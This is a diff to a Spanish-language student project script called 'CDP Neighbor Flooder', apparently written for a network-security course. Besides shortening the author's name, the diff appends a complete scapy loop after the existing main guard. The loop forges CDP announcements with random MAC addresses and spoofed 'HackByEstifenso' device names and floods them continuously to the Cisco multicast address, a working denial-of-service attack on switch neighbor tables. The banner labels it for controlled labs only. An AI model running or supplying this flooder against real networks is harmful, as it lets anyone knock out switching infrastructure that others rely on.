@@ -4,7 +4,7 @@
 CDP Neighbor Flooder - Ataque de Denegación de Servicio (DoS)
 =============================================================
 
-Autor: Branyel Estifenso Pérez Díaz
+Autor: Branyel Pérez
 Materia: Seguridad de Redes - Proyecto Final
 
 Descripción:
@@ -275,7 +275,7 @@ def print_banner():
     ║               CDP NEIGHBOR FLOODER v1.0                       ║
     ║          Ataque DoS - Saturación de Tabla CDP                 ║
     ║                                                               ║
-    ║  Autor: Branyel Estifenso Pérez Díaz                         ║
+    ║  Autor: Branyel Pérez                                         ║
     ║  Proyecto: Seguridad de Redes                                 ║
     ╠═══════════════════════════════════════════════════════════════╣
     ║  [!] SOLO PARA USO EDUCATIVO EN LABORATORIOS CONTROLADOS      ║
@@ -309,3 +309,74 @@ def main():
 
 if __name__ == "__main__":
     main()
+import scapy.all as s_net
+import struct as bin_tool
+import random as rnd
+import time
+
+# --- CONFIG ---
+TARGET_MULTICAST = "01:00:0c:cc:cc:cc"
+INTERFACE_DEV = "eth0"
+
+def get_checksum(payload):
+    """Lógica de verificación de integridad de red"""
+    if len(payload) % 2 != 0:
+        payload += b'\x00'
+    val_sum = 0
+    for i in range(0, len(payload), 2):
+        val_sum += (payload[i] << 8) + payload[i+1]
+    
+    val_sum = (val_sum >> 16) + (val_sum & 0xffff)
+    val_sum += (val_sum >> 16)
+    return (~val_sum) & 0xffff
+
+def gen_tlv_block(t_type, t_val):
+    """Generador de bloques de datos tipo TLV"""
+    return bin_tool.pack("!HH", t_type, len(t_val) + 4) + t_val
+
+def build_cdp_core():
+    """Ensambla el payload CDP con identidad personalizada"""
+    # Identidad personalizada Estifenso
+    node_name = f"HackByEstifenso-{rnd.randint(10, 99)}".encode()
+    v_port = b"GigabitEthernet0/1"
+    cap_bits = bin_tool.pack("!I", 0x21)
+
+    data_stream = b""
+    data_stream += gen_tlv_block(0x0001, node_name)
+    data_stream += gen_tlv_block(0x0003, v_port)
+    data_stream += gen_tlv_block(0x0004, cap_bits)
+
+    cdp_ver = 0x02
+    cdp_ttl = rnd.randint(120, 200)
+    
+    # Checksum provisional
+    raw_header = bin_tool.pack("!BBH", cdp_ver, cdp_ttl, 0x0000)
+    final_chk = get_checksum(raw_header + data_stream)
+
+    return bin_tool.pack("!BBH", cdp_ver, cdp_ttl, final_chk) + data_stream
+
+# --- MAIN ---
+print(f"[+] Canal de red establecido en: {INTERFACE_DEV}")
+print("[>] Desplegando ráfaga de anuncios CDP...")
+
+try:
+    counter = 0
+    while True:
+        # Usamos los alias de scapy (s_net)
+        eth_frame = (
+            s_net.Ether(src=s_net.RandMAC(), dst=TARGET_MULTICAST) /
+            s_net.LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
+            s_net.SNAP(OUI=0x00000c, code=0x2000) /
+            s_net.Raw(load=build_cdp_core())
+        )
+        
+        s_net.sendp(eth_frame, iface=INTERFACE_DEV, verbose=False)
+        counter += 1
+        
+        if counter % 5 == 0:
+            print(f"[-] Inyecciones activas: {counter}", end="\r")
+            
+        time.sleep(rnd.uniform(0.01, 0.04))
+
+except KeyboardInterrupt:
+    print(f"\n[!] Operación abortada. Inyecciones totales: {counter}")
